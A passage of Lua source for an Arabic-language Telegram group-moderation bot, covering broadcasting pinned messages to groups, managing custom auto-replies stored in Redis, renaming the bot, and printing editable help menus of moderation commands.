if DevBrAnD:get(BrAnD.."BrAnD:Send:Gp:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" then   
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevBrAnD:del(BrAnD.."BrAnD:Send:Gp:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = DevBrAnD:smembers(BrAnD.."BrAnD:Groups") 
if msg.content_.text_ then
for k,v in pairs(list) do 
BrAnDText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
DevBrAnD:set(BrAnD..'BrAnD:PinnedMsgs'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
BrAnDText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
DevBrAnD:set(BrAnD..'BrAnD:PinnedMsgs'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
BrAnDText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
DevBrAnD:set(BrAnD..'BrAnD:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.video_ then
for k,v in pairs(list) do 
BrAnDText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
DevBrAnD:set(BrAnD..'BrAnD:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
end 
elseif msg.content_.voice_ then
for k,v in pairs(list) do 
BrAnDText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
DevBrAnD:set(BrAnD..'BrAnD:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
end 
elseif msg.content_.audio_ then
for k,v in pairs(list) do 
BrAnDText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
DevBrAnD:set(BrAnD..'BrAnD:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
end 
elseif msg.content_.document_ then
for k,v in pairs(list) do 
BrAnDText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
DevBrAnD:set(BrAnD..'BrAnD:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
BrAnDText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
DevBrAnD:set(BrAnD..'BrAnD:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم اذاعة "..BrAnDText.." بالتثبيت \n♰ ⌯ ‏في ↫ ❨ "..#list.." ❩ مجموعه \n ✓", 1, 'md')
DevBrAnD:del(BrAnD.."BrAnD:Send:Gp:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
--     SoUrCe BrAnD     --
text = msg.content_.text_
if msg.content_.text_ == 'حذف رد' and Manager(msg) and ChCheck(msg) or msg.content_.text_ == 'مسح رد' and  Manager(msg) and ChCheck(msg) then
DevBrAnD:set(BrAnD..'BrAnD:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_,'DelGpRed')
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
if msg.content_.text_ == 'اضف رد' and Manager(msg) and ChCheck(msg) then
DevBrAnD:set(BrAnD..'BrAnD:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_,'SetGpRed')
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ حسنا ارسل الكلمه الان " ,  1, "md")
return false    end
if msg.content_.text_ then
local SetGpRed = DevBrAnD:get(BrAnD..'BrAnD:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
if SetGpRed == 'SetGpRed' then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n♰ ⌯ يمكنك اضافة الى النص ↫ ⤈\n⍆═════BR═════⍅\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n⍆═════BR═════⍅\n♰ ⌯ للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
DevBrAnD:set(BrAnD..'BrAnD:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'','SaveGpRed')
DevBrAnD:set(BrAnD..'BrAnD:Add:GpText'..msg.sender_user_id_..''..msg.chat_id_..'',msg.content_.text_)
DevBrAnD:sadd(BrAnD..'BrAnD:Manager:GpRed'..msg.chat_id_..'',msg.content_.text_)
DevBrAnD:set(BrAnD..'DelManagerRep'..msg.chat_id_..'',msg.content_.text_)
return false
end
end
--     SoUrCe BrAnD     --
text = msg.content_.text_
if msg.content_.text_ == 'حذف رد عام' and Sudo(msg) or msg.content_.text_ == '↫ حذف رد عام♰' and Sudo(msg) or msg.content_.text_ == 'مسح رد عام' and Sudo(msg) then
DevBrAnD:set(BrAnD.."BrAnD:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
if msg.content_.text_ == 'اضف رد عام' and Sudo(msg) or msg.content_.text_ == '↫ اضف رد عام♰' and Sudo(msg) then
DevBrAnD:set(BrAnD.."BrAnD:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ حسنا ارسل الكلمه الان " ,  1, "md")
return false    end
if msg.content_.text_ then
local SetAllRed = DevBrAnD:get(BrAnD.."BrAnD:Add:AllRed"..msg.sender_user_id_)
if SetAllRed == 'SetAllRed' then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n♰ ⌯ يمكنك اضافة الى النص ↫ ⤈\n⍆═════BR═════⍅\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n⍆═════BR═════⍅\n♰ ⌯ للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
DevBrAnD:set(BrAnD.."BrAnD:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
DevBrAnD:set(BrAnD.."BrAnD:Add:AllText"..msg.sender_user_id_, msg.content_.text_)
DevBrAnD:sadd(BrAnD.."BrAnD:Sudo:AllRed",msg.content_.text_)
DevBrAnD:set(BrAnD.."DelSudoRep",msg.content_.text_)
return false 
end end
--     SoUrCe BrAnD     --
if msg.content_.text_ == 'الردود' and Manager(msg) and ChCheck(msg) or msg.content_.text_ == 'ردود المدير' and Manager(msg) and ChCheck(msg) then
local redod = DevBrAnD:smembers(BrAnD..'BrAnD:Manager:GpRed'..msg.chat_id_..'')
MsgRep = '♰ ⌯ ردود المدير ↫ ⤈ \n⍆═════BR═════⍅\n'
for k,v in pairs(redod) do
if DevBrAnD:get(BrAnD.."BrAnD:Gif:GpRed"..v..msg.chat_id_) then
dp = 'متحركه 🎭'
elseif DevBrAnD:get(BrAnD.."BrAnD:Voice:GpRed"..v..msg.chat_id_) then
dp = 'بصمه 🎙'
elseif DevBrAnD:get(BrAnD.."BrAnD:Stecker:GpRed"..v..msg.chat_id_) then
dp = 'ملصق 🃏'
elseif DevBrAnD:get(BrAnD.."BrAnD:Text:GpRed"..v..msg.chat_id_) then
dp = 'رساله ✉'
elseif DevBrAnD:get(BrAnD.."BrAnD:Photo:GpRed"..v..msg.chat_id_) then
dp = 'صوره 🎇'
elseif DevBrAnD:get(BrAnD.."BrAnD:Video:GpRed"..v..msg.chat_id_) then
dp = 'فيديو 📽'
elseif DevBrAnD:get(BrAnD.."BrAnD:File:GpRed"..v..msg.chat_id_) then
dp = 'ملف 📁'
elseif DevBrAnD:get(BrAnD.."BrAnD:Audio:GpRed"..v..msg.chat_id_) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..''..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = '♰ ⌯ لا توجد ردود مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
--     SoUrCe BrAnD     --
if msg.content_.text_ == 'حذف الردود' and Manager(msg) and ChCheck(msg) or msg.content_.text_ == 'مسح الردود' and Manager(msg) and ChCheck(msg) or msg.content_.text_ == 'حذف ردود المدير' and Manager(msg) and ChCheck(msg) or msg.content_.text_ == 'مسح ردود المدير' and Manager(msg) and ChCheck(msg) then
local redod = DevBrAnD:smembers(BrAnD..'BrAnD:Manager:GpRed'..msg.chat_id_..'')
if #redod == 0 then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevBrAnD:del(BrAnD..'BrAnD:Gif:GpRed'..v..msg.chat_id_)
DevBrAnD:del(BrAnD..'BrAnD:Voice:GpRed'..v..msg.chat_id_)
DevBrAnD:del(BrAnD..'BrAnD:Audio:GpRed'..v..msg.chat_id_)
DevBrAnD:del(BrAnD..'BrAnD:Photo:GpRed'..v..msg.chat_id_)
DevBrAnD:del(BrAnD..'BrAnD:Stecker:GpRed'..v..msg.chat_id_)
DevBrAnD:del(BrAnD..'BrAnD:Video:GpRed'..v..msg.chat_id_)
DevBrAnD:del(BrAnD..'BrAnD:File:GpRed'..v..msg.chat_id_)
DevBrAnD:del(BrAnD..'BrAnD:Text:GpRed'..v..msg.chat_id_)
DevBrAnD:del(BrAnD..'BrAnD:Manager:GpRed'..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف ردود المدير")  
return false
end
end
--     SoUrCe BrAnD     --
if  msg.content_.text_ == "ردود المطور" and Sudo(msg) or msg.content_.text_ == "الردود العام" and Sudo(msg) or msg.content_.text_ == "ردود العام" and Sudo(msg) or msg.content_.text_ == "↫ الردود العام♰" and Sudo(msg) then
local redod = DevBrAnD:smembers(BrAnD.."BrAnD:Sudo:AllRed")
MsgRep = '♰ ⌯ ردود المطور ↫ ⤈ \n⍆═════BR═════⍅\n'
for k,v in pairs(redod) do
if DevBrAnD:get(BrAnD.."BrAnD:Gif:AllRed"..v) then
dp = 'متحركه 🎭'
elseif DevBrAnD:get(BrAnD.."BrAnD:Voice:AllRed"..v) then
dp = 'بصمه 🎙'
elseif DevBrAnD:get(BrAnD.."BrAnD:Stecker:AllRed"..v) then
dp = 'ملصق 🃏'
elseif DevBrAnD:get(BrAnD.."BrAnD:Text:AllRed"..v) then
dp = 'رساله ✉'
elseif DevBrAnD:get(BrAnD.."BrAnD:Photo:AllRed"..v) then
dp = 'صوره 🎇'
elseif DevBrAnD:get(BrAnD.."BrAnD:Video:AllRed"..v) then
dp = 'فيديو 📽'
elseif DevBrAnD:get(BrAnD.."BrAnD:File:AllRed"..v) then
dp = 'ملف 📁'
elseif DevBrAnD:get(BrAnD.."BrAnD:Audio:AllRed"..v) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..''..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = '♰ ⌯ لا توجد ردود مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
--     SoUrCe BrAnD     --
if msg.content_.text_ == "حذف ردود المطور" and Sudo(msg) or msg.content_.text_ == "حذف ردود العام" and Sudo(msg) or msg.content_.text_ == "مسح ردود المطور" and Sudo(msg) then
local redod = DevBrAnD:smembers(BrAnD.."BrAnD:Sudo:AllRed")
if #redod == 0 then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevBrAnD:del(BrAnD.."BrAnD:Add:AllRed"..v)
DevBrAnD:del(BrAnD.."BrAnD:Gif:AllRed"..v)
DevBrAnD:del(BrAnD.."BrAnD:Voice:AllRed"..v)
DevBrAnD:del(BrAnD.."BrAnD:Audio:AllRed"..v)
DevBrAnD:del(BrAnD.."BrAnD:Photo:AllRed"..v)
DevBrAnD:del(BrAnD.."BrAnD:Stecker:AllRed"..v)
DevBrAnD:del(BrAnD.."BrAnD:Video:AllRed"..v)
DevBrAnD:del(BrAnD.."BrAnD:File:AllRed"..v)
DevBrAnD:del(BrAnD.."BrAnD:Text:AllRed"..v)
DevBrAnD:del(BrAnD.."BrAnD:Sudo:AllRed")
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف ردود المطور")  
return false
end
end 
--     SoUrCe BrAnD     --
if Admin(msg) then
if text and text == "تغيير اسم البوت" or text and text == "وضع اسم البوت" or text and text == "تغير اسم البوت" then
if not Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ للمطور الاساسي فقط ', 1, 'md')
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ ارسل لي اسم البوت الان" ,  1, "md") 
DevBrAnD:set(BrAnD..'BrAnD:NameBot'..msg.sender_user_id_..'', 'msg')
return false 
end
end
if text and text == 'حذف اسم البوت' or text == 'مسح اسم البوت' then
if not Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ للمطور الاساسي فقط ', 1, 'md')
else
DevBrAnD:del(BrAnD..'BrAnD:NameBot')
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم حذف اسم البوت'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
end end 
--     SoUrCe BrAnD     --
if text and text:match("^استعاده الاوامر$") and Sudo(msg) or text and text:match("^استعادة كلايش الاوامر$") and Sudo(msg) then
HelpList ={'BrAnD:Help','BrAnD:Help1','BrAnD:Help2','BrAnD:Help3','BrAnD:Help4','BrAnD:Help5','BrAnD:Help6'}
for i,Help in pairs(HelpList) do
DevBrAnD:del(BrAnD..Help) 
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم استعادة الكلايش الاصليه" ,  1, "md") 
end
if text and text:match("^تعيين الاوامر$") and Sudo(msg) or text and text:match("^تعيين امر الاوامر$") and Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ ارسل كليشة (الاوامر) الان " ,  1, "md")
DevBrAnD:set(BrAnD..'BrAnD:Help0'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local BrAnDTeAM=  DevBrAnD:get(BrAnD..'BrAnD:Help0'..msg.sender_user_id_)
if BrAnDTeAM== 'msg' then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم حفظ الكليشه الجديده " ,  1, "md")
DevBrAnD:del(BrAnD..'BrAnD:Help0'..msg.sender_user_id_)
DevBrAnD:set(BrAnD..'BrAnD:Help', text)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^الاوامر$") or text and text:match("^اوامر$") or text and text:match("^مساعده$") then
local Help = DevBrAnD:get(BrAnD..'BrAnD:Help')
local text =  [[
♰ ⌯ اهلا بك في قائمة الاوامر ↫ ⤈ 
⍆═════BR═════⍅
♰ ⌯ م1 ↫ اوامر الحمايه
♰ ⌯ م2 ↫ اوامر الادمنيه
♰ ⌯ م3 ↫ اوامر المدراء
♰ ⌯ م4 ↫ اوامر المنشئين
♰ ⌯ م5 ↫ اوامر المطورين
♰ ⌯ م6 ↫ اوامر الاعضاء
⍆═════BR═════⍅
♰ ⌯ [SoUrCe ChANnEl](https://t.me/CXRCX)
]] 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end
if text and text:match("^تعيين امر م1$") and Sudo(msg) or text and text:match("^تعيين امر م١$") and Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ ارسل كليشة (م1) الان " ,  1, "md")
DevBrAnD:set(BrAnD..'BrAnD:Help01'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local BrAnDTeAM=  DevBrAnD:get(BrAnD..'BrAnD:Help01'..msg.sender_user_id_)
if BrAnDTeAM== 'msg' then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم حفظ الكليشه الجديده " ,  1, "md")
DevBrAnD:del(BrAnD..'BrAnD:Help01'..msg.sender_user_id_)
DevBrAnD:set(BrAnD..'BrAnD:Help1', text)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م1$") or text and text:match("^م١$") or text and text:match("^اوامر1$") or text and text:match("^اوامر١$") then
local Help = DevBrAnD:get(BrAnD..'BrAnD:Help1')
local text =  [[
♰ ⌯ اوامر حماية المجموعه ↫ ⤈
⍆═════BR═════⍅
♰ ⌯ قفل • فتح ↫ الروابط
♰ ⌯ قفل • فتح ↫ المعرفات
♰ ⌯ قفل • فتح ↫ البوتات
♰ ⌯ قفل • فتح ↫ المتحركه
♰ ⌯ قفل • فتح ↫ الملصقات
♰ ⌯ قفل • فتح ↫ الملفات
♰ ⌯ قفل • فتح ↫ الصور
♰ ⌯ قفل • فتح ↫ الفيديو
♰ ⌯ قفل • فتح ↫ الاونلاين
♰ ⌯ قفل • فتح ↫ الدردشه
♰ ⌯ قفل • فتح ↫ التوجيه
♰ ⌯ قفل • فتح ↫ الاغاني
♰ ⌯ قفل • فتح ↫ الصوت
♰ ⌯ قفل • فتح ↫ الجهات
♰ ⌯ قفل • فتح ↫ الماركداون
♰ ⌯ قفل • فتح ↫ التكرار
♰ ⌯ قفل • فتح ↫ الهاشتاك
♰ ⌯ قفل • فتح ↫ التعديل
♰ ⌯ قفل • فتح ↫ التثبيت
♰ ⌯ قفل • فتح ↫ الاشعارات
♰ ⌯ قفل • فتح ↫ الكلايش
♰ ⌯ قفل • فتح ↫ الدخول
♰ ⌯ قفل • فتح ↫ الشبكات
♰ ⌯ قفل • فتح ↫ المواقع
♰ ⌯ قفل • فتح ↫ الفشار
♰ ⌯ قفل • فتح ↫ الكفر
♰ ⌯ قفل • فتح ↫ الطائفيه
♰ ⌯ قفل • فتح ↫ الكل
♰ ⌯ قفل • فتح ↫ العربيه
♰ ⌯ قفل • فتح ↫ الانكليزيه
♰ ⌯ قفل • فتح ↫ الفارسيه
♰ ⌯ قفل • فتح ↫ التفليش
⍆═════BR═════⍅
♰ ⌯ اوامر حمايه اخرى ↫ ⤈
⍆═════BR═════⍅
♰ ⌯ قفل • فتح + الامر ↫ ⤈
♰ ⌯ التكرار بالطرد
♰ ⌯ التكرار بالكتم
♰ ⌯ التكرار بالتقيد
♰ ⌯ الفارسيه بالطرد
♰ ⌯ البوتات بالطرد
♰ ⌯ البوتات بالتقيد
⍆═════BR═════⍅
♰ ⌯ [SoUrCe ChANnEl](https://t.me/CXRCX)
]]
Dev_BrAnD(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end
if text and text:match("^تعيين امر م2$") and Sudo(msg) or text and text:match("^تعيين امر م٢$") and Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ ارسل كليشة (م2) الان " ,  1, "md")
DevBrAnD:set(BrAnD..'BrAnD:Help21'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local BrAnDTeAM=  DevBrAnD:get(BrAnD..'BrAnD:Help21'..msg.sender_user_id_)
if BrAnDTeAM== 'msg' then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم حفظ الكليشه الجديده " ,  1, "md")
DevBrAnD:del(BrAnD..'BrAnD:Help21'..msg.sender_user_id_)
DevBrAnD:set(BrAnD..'BrAnD:Help2', text)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م2$") or text and text:match("^م٢$") or text and text:match("^اوامر2$") or text and text:match("^اوامر٢$") then
local Help = DevBrAnD:get(BrAnD..'BrAnD:Help2')
local text =  [[
♰ ⌯ اوامر الادمنيه ↫ ⤈
⍆═════BR═════⍅
♰ ⌯ الاعدادت
♰ ⌯ تاك للكل 
♰ ⌯ انشاء رابط
♰ ⌯ ضع وصف
♰ ⌯ ضع رابط
♰ ⌯ ضع صوره
♰ ⌯ حذف الرابط
♰ ⌯ حذف المطايه
♰ ⌯ كشف البوتات
♰ ⌯ طرد البوتات
♰ ⌯ تنظيف + العدد
♰ ⌯ تنظيف التعديل
♰ ⌯ كللهم + الكلمه
♰ ⌯ اسم البوت + الامر
♰ ⌯ ضع • حذف ↫ ترحيب
♰ ⌯ ضع • حذف ↫ قوانين
♰ ⌯ اضف • حذف ↫ صلاحيه
♰ ⌯ الصلاحيات • حذف الصلاحيات
⍆═════BR═════⍅
♰ ⌯ ضع سبام + العدد
♰ ⌯ ضع تكرار + العدد
⍆═════BR═════⍅
♰ ⌯ رفع مميز • تنزيل مميز
♰ ⌯ المميزين • حذف المميزين
♰ ⌯ كشف القيود • رفع القيود
⍆═════BR═════⍅
♰ ⌯ حذف • مسح + بالرد
♰ ⌯ منع • الغاء منع
♰ ⌯ قائمه المنع
♰ ⌯ حذف قائمه المنع
⍆═════BR═════⍅
♰ ⌯ تفعيل • تعطيل ↫ الرابط
♰ ⌯ تفعيل • تعطيل ↫ الالعاب
♰ ⌯ تفعيل • تعطيل ↫ الترحيب
♰ ⌯ تفعيل • تعطيل ↫ كشف الاعدادات
⍆═════BR═════⍅
♰ ⌯ طرد المحذوفين
♰ ⌯ طرد ↫ بالرد • بالمعرف • بالايدي
♰ ⌯ كتم • الغاء كتم
♰ ⌯ تقيد • الغاء تقيد
♰ ⌯ حظر • الغاء حظر
♰ ⌯ المكتومين • حذف المكتومين
♰ ⌯ المقيدين • حذف المقيدين
♰ ⌯ المحظورين • حذف المحظورين
⍆═════BR═════⍅
♰ ⌯ تقييد دقيقه + عدد الدقائق
♰ ⌯ تقييد ساعه + عدد الساعات
♰ ⌯ تقييد يوم + عدد الايام
♰ ⌯ الغاء تقييد ↫ لالغاء التقييد بالوقت
⍆═════BR═════⍅
♰ ⌯ [SoUrCe ChANnEl](https://t.me/CXRCX)
]]
Dev_BrAnD(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end
if text and text:match("^تعيين امر م3$") and Sudo(msg) or text and text:match("^تعيين امر م٣$") and Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ ارسل كليشة (م3) الان " ,  1, "md")
DevBrAnD:set(BrAnD..'BrAnD:Help31'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local BrAnDTeAM=  DevBrAnD:get(BrAnD..'BrAnD:Help31'..msg.sender_user_id_)
if BrAnDTeAM== 'msg' then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم حفظ الكليشه الجديده " ,  1, "md")
DevBrAnD:del(BrAnD..'BrAnD:Help31'..msg.sender_user_id_)
DevBrAnD:set(BrAnD..'BrAnD:Help3', text)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م3$") or text and text:match("^م٣$") or text and text:match("^اوامر3$") or text and text:match("^اوامر٣$") then
local Help = DevBrAnD:get(BrAnD..'BrAnD:Help3')
local text =  [[
♰ ⌯ اوامر المدراء ↫ ⤈
⍆═════BR═════⍅
♰ ⌯ فحص البوت
♰ ⌯ ضع اسم + الاسم
♰ ⌯ اضف • حذف ↫ رد
♰ ⌯ ردود المدير
♰ ⌯ حذف ردود المدير
♰ ⌯ حذف قوائم المنع
♰ ⌯ منع ↫ بالرد على ( ملصق • صوره • متحركه )
♰ ⌯ حذف قائمه منع + ↫ ⤈
( الصور • المتحركات • الملصقات )
⍆═════BR═════⍅
♰ ⌯ تنزيل الكل
♰ ⌯ رفع ادمن • تنزيل ادمن
♰ ⌯ الادمنيه • حذف الادمنيه
⍆═════BR═════⍅
♰ ⌯ تثبيت
♰ ⌯ الغاء التثبيت
♰ ⌯ اعاده التثبيت
♰ ⌯ الغاء تثبيت الكل
⍆═════BR═════⍅
♰ ⌯ تغير رد + اسم الرتبه + النص ↫ ⤈
♰ ⌯ المطور • منشئ الاساسي
♰ ⌯ المنشئ • المدير • الادمن
♰ ⌯ المميز • المنظف • العضو
♰ ⌯ حذف ردود الرتب
⍆═════BR═════⍅
♰ ⌯ تغيير الايدي ↫ لتغيير الكليشه
♰ ⌯ تعيين الايدي ↫ لتعيين الكليشه
♰ ⌯ حذف الايدي ↫ لحذف الكليشه
⍆═════BR═════⍅
♰ ⌯ تفعيل • تعطيل + الامر ↫ ⤈
♰ ⌯ اطردني • الايدي بالصوره • الابراج
♰ ⌯ معاني الاسماء • اوامر النسب
♰ ⌯ الايدي • تحويل الصيغ • اوامر التحشيش
♰ ⌯ ردود المدير • ردود المطور
♰ ⌯ ضافني • حساب العمر • الزخرفه
⍆═════BR═════⍅
♰ ⌯ [SoUrCe ChANnEl](https://t.me/CXRCX)
]]
Dev_BrAnD(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end
if text and text:match("^تعيين امر م4$") and Sudo(msg) or text and text:match("^تعيين امر م٤$") and Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ ارسل كليشة (م4) الان " ,  1, "md")
DevBrAnD:set(BrAnD..'BrAnD:Help41'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local BrAnDTeAM=  DevBrAnD:get(BrAnD..'BrAnD:Help41'..msg.sender_user_id_)
if BrAnDTeAM== 'msg' then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم حفظ الكليشه الجديده" ,  1, "md")
DevBrAnD:del(BrAnD..'BrAnD:Help41'..msg.sender_user_id_)
DevBrAnD:set(BrAnD..'BrAnD:Help4', text)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م٤$") or text and text:match("^م4$") or text and text:match("^اوامر4$") or text and text:match("^اوامر٤$") then
local Help = DevBrAnD:get(BrAnD..'BrAnD:Help4')
local text =  [[
♰ ⌯ اوامر المنشئين ↫ ⤈
⍆═════BR═════⍅
♰ ⌯ تنزيل الكل
♰ ⌯ الميديا • امسح
♰ ⌯ اضف • حذف ↫ امر
♰ ⌯ حذف الاوامر المضافه
♰ ⌯ الاوامر المضافه
♰ ⌯ اضف نقاط ↫ بالرد • بالايدي
♰ ⌯ اضف رسائل ↫ بالرد • بالايدي
♰ ⌯ رفع منظف • تنزيل منظف
♰ ⌯ المنظفين • حذف المنظفين
♰ ⌯ رفع مدير • تنزيل مدير
♰ ⌯ المدراء • حذف المدراء
♰ ⌯ تفعيل • تعطيل + الامر ↫ ⤈
♰ ⌯ نزلني • امسح
♰ ⌯ الحظر • الكتم
⍆═════BR═════⍅
♰ ⌯ اوامر المنشئين الاساسيين ↫ ⤈
⍆═════BR═════⍅
♰ ⌯ وضع لقب + اللقب
♰ ⌯ تفعيل • تعطيل ↫ الرفع
♰ ⌯ رفع منشئ • تنزيل منشئ
♰ ⌯ المنشئين • حذف المنشئين
♰ ⌯ رفع • تنزيل ↫ مشرف
♰ ⌯ رفع بكل الصلاحيات
♰ ⌯ حذف القوائم
⍆═════BR═════⍅
♰ ⌯ اوامر منشئ المجموعه ↫ ⤈
⍆═════BR═════⍅
♰ ⌯ رفع • تنزيل ↫ منشئ اساسي
♰ ⌯ حذف المنشئين الاساسيين 
♰ ⌯ المنشئين الاساسيين 
♰ ⌯ حذف جميع الرتب
⍆═════BR═════⍅
♰ ⌯ [SoUrCe ChANnEl](https://t.me/CXRCX)
]]
Dev_BrAnD(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end
if text and text:match("^تعيين امر م5$") and Sudo(msg) or text and text:match("^تعيين امر م٥$") and Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ ارسل كليشة (م5) الان " ,  1, "md")
DevBrAnD:set(BrAnD..'BrAnD:Help51'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local BrAnDTeAM=  DevBrAnD:get(BrAnD..'BrAnD:Help51'..msg.sender_user_id_)
if BrAnDTeAM== 'msg' then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم حفظ الكليشه الجديده " ,  1, "md")
DevBrAnD:del(BrAnD..'BrAnD:Help51'..msg.sender_user_id_)
DevBrAnD:set(BrAnD..'BrAnD:Help5', text)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
